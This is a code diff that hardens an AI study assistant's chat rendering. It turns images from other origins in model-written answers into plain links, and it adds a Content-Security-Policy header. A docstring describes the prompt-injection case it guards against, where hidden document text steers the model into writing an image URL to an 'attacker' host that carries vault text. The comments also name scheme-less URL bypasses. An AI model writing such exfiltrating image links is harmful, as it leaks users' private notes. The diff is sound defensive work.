@@ -716,11 +716,56 @@ def _strip_ofm_meta(text: str) -> str:
     return "\n".join(pieces)
 
 
-def _linkify(text: str, resolve=None) -> str:
+def _is_own_image(src: str) -> bool:
+    """Whether an image source stays on this origin: the vault through /asset,
+    or inline data. An allowlist and not an `http(s)://` test, because
+    `//host/x` and `/\\host/x` (a browser reads `\\` as `/`) carry no scheme and
+    still fetch from the host they name; the first draft of ADR-0098 H6 missed
+    both. Control characters and spaces go first, as `_safe_url` drops them."""
+    probe = "".join(ch for ch in _html.unescape(src) if ord(ch) > 0x20).lower()
+    return probe.startswith(("/asset?", "data:image/"))
+
+
+def _foreign_img_link(src: str) -> str:
+    """An image from another origin as a link that names the host it would
+    have been fetched from: the student can still open it, by a click."""
+    from urllib.parse import urlsplit
+
+    parts = urlsplit("".join(ch for ch in src if ord(ch) > 0x20).replace("\\", "/"))
+    host = _html.escape(parts.hostname or "another site")
+    if parts.scheme.lower() not in ("http", "https", ""):
+        return f'<span class="remote-img">image from {host}</span>'
+    return (f'<a class="remote-img" href="{_html.escape(src, quote=True)}" rel="noopener noreferrer" '
+            f'target="_blank">image from {host}</a>')
+
+
+# After _HtmlAllowlist every attribute is name="value" with `"` escaped, so a
+# raw <img>'s source has this one shape.
+_RAW_IMG_TAG = re.compile(r"<img\b[^>]*>", re.IGNORECASE)
+_RAW_SRC_ATTR = re.compile(r'\ssrc="([^"]*)"')
+
+
+def _unembed_foreign_imgs(fragment: str) -> str:
+    def sub(m: "re.Match[str]") -> str:
+        src = _RAW_SRC_ATTR.search(m.group(0))
+        if not src or _is_own_image(src.group(1)):
+            return m.group(0)
+        return _foreign_img_link(_html.unescape(src.group(1)))
+
+    return _RAW_IMG_TAG.sub(sub, fragment)
+
+
+def _linkify(text: str, resolve=None, remote_images: bool = True) -> str:
     """Render markdown (+ OFM sugar) to HTML, linkifying resolvable note refs
     when `resolve` is given. Works on the markdown-it token stream, so
     `code_inline`/`fence` are separate token types and code is never linkified
-    or tag-ified by construction."""
+    or tag-ified by construction.
+
+    `remote_images=False` is for anything the model wrote: an image from
+    another origin becomes a link naming its host. Text a document hid from the
+    student can steer an answer into `![](https://attacker/?d=<vault text>)`,
+    which the browser fetched the moment it drew it (reproduced 2026-10-13,
+    ADR-0098 H6). A note keeps its web images, as Obsidian draws them."""
     from markdown_it import MarkdownIt
     from markdown_it.token import Token
     from mdit_py_plugins.dollarmath import dollarmath_plugin
@@ -752,6 +797,8 @@ def _linkify(text: str, resolve=None) -> str:
     for tok in tokens:
         if tok.type == "html_block":
             tok.content = _rewrite_raw_img_src(tok.content)
+            if not remote_images:
+                tok.content = _unembed_foreign_imgs(tok.content)
             continue
         if tok.type != "inline" or not tok.children:
             continue
@@ -770,6 +817,8 @@ def _linkify(text: str, resolve=None) -> str:
                 depth = max(0, depth - 1)
             if child.type == "html_inline":
                 child.content = _rewrite_raw_img_src(child.content)
+                if not remote_images:
+                    child.content = _unembed_foreign_imgs(child.content)
                 new.append(child)
                 continue
             if child.type == "image":
@@ -777,7 +826,13 @@ def _linkify(text: str, resolve=None) -> str:
                 # and data: URLs pass untouched)
                 src = str(child.attrGet("src") or "")
                 if src and not src.startswith(("http://", "https://", "data:", "/")):
-                    child.attrSet("src", "/asset?path=" + _quote(src))
+                    src = "/asset?path=" + _quote(src)
+                    child.attrSet("src", src)
+                if not remote_images and src and not _is_own_image(src):
+                    link = Token("html_inline", "", 0)
+                    link.content = _foreign_img_link(src)
+                    new.append(link)
+                    continue
                 new.append(child)
                 continue
             if child.type == "math_inline":
@@ -966,7 +1021,7 @@ async def run_turn(text: str, attachments: "Sequence[Path]" = ()) -> AsyncIterat
             _narrate_user_turn(messages[-1])
             messages.append({"role": "assistant", "content": answer})
             _narr.NARRATOR.turn(messages[-1])
-            done = {"type": "done", "answer": answer, "html": _linkify(answer), **_ctx_meter()}
+            done = {"type": "done", "answer": answer, "html": _linkify(answer, remote_images=False), **_ctx_meter()}
             if (saved := user_memory.undo_payload(out)) is not None:
                 done["memory"] = saved
             outcome = "done"
@@ -1012,7 +1067,7 @@ async def run_turn(text: str, attachments: "Sequence[Path]" = ()) -> AsyncIterat
                 yield {
                     "type": "done",
                     "answer": answer,
-                    "html": _linkify(answer, note_resolver()),
+                    "html": _linkify(answer, note_resolver(), remote_images=False),
                     **_ctx_meter(),
                 }
                 return
@@ -1113,7 +1168,7 @@ async def run_turn(text: str, attachments: "Sequence[Path]" = ()) -> AsyncIterat
         # note_resolver reads the DRIVER graph — with the ws backend installed
         # (silica connect) a driver call on the loop thread deadlocks (`_rpc`
         # blocks the very loop that must send the frame), so render off-loop.
-        html = await asyncio.to_thread(lambda: _linkify(answer, note_resolver()))
+        html = await asyncio.to_thread(lambda: _linkify(answer, note_resolver(), remote_images=False))
         done = {
             "type": "done",
             "answer": answer,
@@ -1274,6 +1329,22 @@ def _public_hosts() -> set[str]:
 
 
 _ALLOWED_HOSTS = {"loopback", *_public_hosts()}
+
+
+@app.middleware("http")
+async def _hosted_image_policy(request: Request, call_next):
+    """On the server, the page draws only its own images (ADR-0098 H6): the
+    layer under `_linkify(remote_images=False)`, and the one that also covers
+    notes, the drawer and the editor's preview. The page loads nothing from
+    another origin, so only web images inside notes stop drawing; locally
+    they still draw (the ADR's open item 3). A response with its own policy
+    (`/asset`'s sandbox) keeps it."""
+    from silica.config import hosted
+
+    response = await call_next(request)
+    if hosted() and "content-security-policy" not in response.headers:
+        response.headers["Content-Security-Policy"] = "img-src 'self' data: blob:"
+    return response
 
 
 @app.middleware("http")
@@ -3691,7 +3762,7 @@ def get_messages():
             content, images = _attached_images(content)
         data.append({"role": m["role"], "content": content, "tools": tools,
                      "thinking": thinking, "images": images,
-                     "html": _linkify(content, resolve) if content else ""})
+                     "html": _linkify(content, resolve, remote_images=False) if content else ""})
         if id(m) in turn_of:
             data[-1]["turn"] = turn_of[id(m)]
     # Vault label + context usage ride headers so the body stays a plain list.
